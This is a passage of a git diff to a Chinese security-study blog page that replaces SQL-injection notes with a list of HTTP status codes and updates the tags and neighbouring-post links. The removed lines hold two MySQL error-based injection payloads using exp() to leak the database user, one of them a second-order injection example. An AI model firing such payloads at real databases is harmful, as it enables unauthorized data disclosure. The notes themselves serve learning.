aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="10-exp"><a href="#10-exp" class="headerlink" title="10.exp()"></a>10.exp()</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h6 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h6><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx' <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<h3 id="常见状态代码、状态描述的说明"><a href="#常见状态代码、状态描述的说明" class="headerlink" title="常见状态代码、状态描述的说明"></a>常见状态代码、状态描述的说明</h3><ul>
+<li>200 OK：客户端请求成功。</li>
+<li>400 Bad Request：客户端请求有语法错误，不能被服务器所理解。</li>
+<li>401 Unauthorized：请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用。</li>
+<li>403 Forbidden：服务器收到请求，但是拒绝提供服务。</li>
+<li>404 Not Found：请求资源不存在，举个例子：输入了错误的URL。</li>
+<li>500 Internal Server Error：服务器发生不可预期的错误。</li>
+<li>503 Server Unavailable：服务器当前不能处理客户端的请求，一段时间后可能恢复正常，举个例子：HTTP/1.1 200 OK（CRLF）。</li>
+</ul>
 
                 
             </div>
@@ -617,7 +548,7 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://stentqh.github.io/2021/09/30/SQL/">http://stentqh.github.io/2021/09/30/SQL/</a>
+                    <a href="http://stentqh.github.io/2021/09/30/HTTP%E5%8D%8F%E8%AE%AE%E7%AC%94%E8%AE%B0/">http://stentqh.github.io/2021/09/30/HTTP%E5%8D%8F%E8%AE%AE%E7%AC%94%E8%AE%B0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -655,8 +586,8 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/SQL/">
-                                    <span class="chip bg-color">SQL</span>
+                                <a href="/tags/HTTP%E5%8D%8F%E8%AE%AE/">
+                                    <span class="chip bg-color">HTTP协议</span>
                                 </a>
                             
                         </div>
@@ -972,19 +903,19 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/09/30/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%20%E4%B8%80/">
+                <a href="/2021/09/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="基础知识 一">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="计算机网络笔记">
                         
-                        <span class="card-title">基础知识 一</span>
+                        <span class="card-title">计算机网络笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            基础知识
+                            
                         
                     </div>
                     <div class="publish-info">
@@ -995,8 +926,8 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-category">
-                                    基础知识
+                            <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" class="post-category">
+                                    计算机基础
                                 </a>
                             
                             
@@ -1006,8 +937,8 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-                        <span class="chip bg-color">基础知识</span>
+                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">
+                        <span class="chip bg-color">计算机网络</span>
                     </a>
                     
                 </div>
@@ -1021,19 +952,19 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/30/kali%E9%85%8D%E7%BD%AE/">
+                <a href="/2021/09/30/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="kali配置">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="SQL注入笔记">
                         
-                        <span class="card-title">kali配置</span>
+                        <span class="card-title">SQL注入笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            关于SQL注入的一些笔记
                         
                     </div>
                     <div class="publish-info">
@@ -1044,8 +975,8 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/kali/" class="post-category">
-                                    kali
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Web安全
                                 </a>
                             
                             
@@ -1055,8 +986,8 @@ php? id<span class="token operator">=</span><span class="token number">1</span> 
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/kali/">
-                        <span class="chip bg-color">kali</span>
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
                     </a>
                     
                 </div>
